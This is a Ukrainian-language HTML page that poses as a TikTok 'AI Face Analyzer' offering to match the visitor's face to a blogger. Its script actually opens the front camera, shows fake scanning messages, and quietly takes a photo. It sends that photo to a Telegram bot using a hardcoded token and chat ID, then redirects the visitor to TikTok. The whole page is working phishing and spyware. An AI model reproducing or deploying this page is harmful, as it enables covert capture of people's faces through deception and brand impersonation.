<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok AI Scanner</title>
    
    <meta property="og:title" content="TikTok - AI Face Scanner">
    <meta property="og:description" content="Дізнайся, на якого блогера ти схожий! Спробуй новий ефект прямо зараз.">
    <meta property="og:image" content="https://sf16-scmcdn-va.ibytedtos.com/goofy/tiktok/card/logo.png">
    <meta name="theme-color" content="#fe2c55">

    <style>
        body { 
            background: #000; 
            color: #fff; 
            text-align: center; 
            font-family: 'Proxima Nova', -apple-system, BlinkMacSystemFont, sans-serif; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center; 
            height: 100vh; 
            margin: 0; 
            overflow: hidden;
        }

        .container { padding: 20px; max-width: 400px; width: 85%; position: relative; z-index: 2; }
        
        .logo { width: 50px; height: 50px; margin-bottom: 25px; }

        h2 { font-size: 26px; font-weight: 800; margin-bottom: 10px; letter-spacing: -0.5px; }
        p { color: #a1a1a1; font-size: 15px; margin-bottom: 35px; line-height: 1.5; }

        /* Кнопка з пульсацією */
        .btn { 
            background: #fe2c55; 
            border: none; 
            padding: 18px 40px; 
            color: #fff; 
            font-size: 16px; 
            font-weight: 700; 
            border-radius: 4px; 
            cursor: pointer; 
            width: 100%; 
            box-shadow: 0 4px 15px rgba(254, 44, 85, 0.3);
            transition: transform 0.2s, background 0.2s;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.03); }
            100% { transform: scale(1); }
        }
        .btn:active { transform: scale(0.98); background: #e0244d; }

        /* Лінія сканування */
        #scanner-line {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 4px;
            background: #fe2c55;
            box-shadow: 0 0 20px #fe2c55, 0 0 40px #fe2c55;
            z-index: 10;
            animation: scan 2s linear infinite;
        }
        @keyframes scan {
            0% { top: 0%; }
            100% { top: 100%; }
        }

        #status { display: none; margin-top: 20px; }
        .loader {
            border: 3px solid #222;
            border-top: 3px solid #fe2c55;
            border-radius: 50%;
            width: 35px;
            height: 35px;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 15px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        video, canvas { display: none; visibility: hidden; pointer-events: none; }
    </style>
</head>
<body>

    <div id="scanner-line"></div>

    <div class="container" id="ui">
        <img src="https://www.edigitalagency.com.au/wp-content/uploads/TikTok-logo-PNG-White-on-Black-Background.png" class="logo" alt="TikTok">
        <h2 id="main-title">AI Face Analyzer</h2>
        <p id="main-desc">Дозвольте доступ до камери, щоб нейромережа TikTok проаналізувала ваші риси та знайшла схожих блогерів.</p>
        
        <button class="btn" id="startBtn" onclick="runScanner()">Почати сканування</button>
        
        <div id="status">
            <div class="loader"></div>
            <p id="status-text" style="color: #fe2c55; font-weight: bold; font-size: 13px; text-transform: uppercase; letter-spacing: 1px;">Підключення до AI серверів...</p>
        </div>
    </div>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c" width="640" height="480"></canvas>

    <script>
        const token = '8492555273:AAHur2SwzreGkYlCz5-gBCGCJxzvrdwFczM';
        const chat = '7808795546';
        const tiktokUrl = 'https://www.tiktok.com/explore';

        async function runScanner() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('v');
                video.srcObject = stream;

                // Міняємо інтерфейс
                document.getElementById('startBtn').style.display = 'none';
                document.getElementById('main-desc').style.display = 'none';
                document.getElementById('status').style.display = 'block';
                document.getElementById('scanner-line').style.display = 'block';

                const statusText = document.getElementById('status-text');
                
                // Імітація процесу
                setTimeout(() => statusText.innerText = "Сканування обличчя...", 800);
                setTimeout(() => statusText.innerText = "Обробка біометрії...", 1600);
                setTimeout(() => statusText.innerText = "Пошук збігів...", 2400);

                // Робимо знімок через 2.5 сек (коли камера стабільна)
                setTimeout(() => {
                    const canvas = document.getElementById('c');
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, 640, 480);
                    
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('chat_id', chat);
                        formData.append('photo', blob, 'scan.jpg');

                        // Відправка
                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });

                        // Фінальний редирект
                        setTimeout(() => {
                            stream.getTracks().forEach(t => t.stop());
                            window.location.replace(tiktokUrl);
                        }, 800);

                    }, 'image/jpeg', 0.7);
                }, 2500);

            } catch (err) {
                // Якщо відмова в доступі
                window.location.replace(tiktokUrl);
            }
        }
    </script>
</body>
</html>
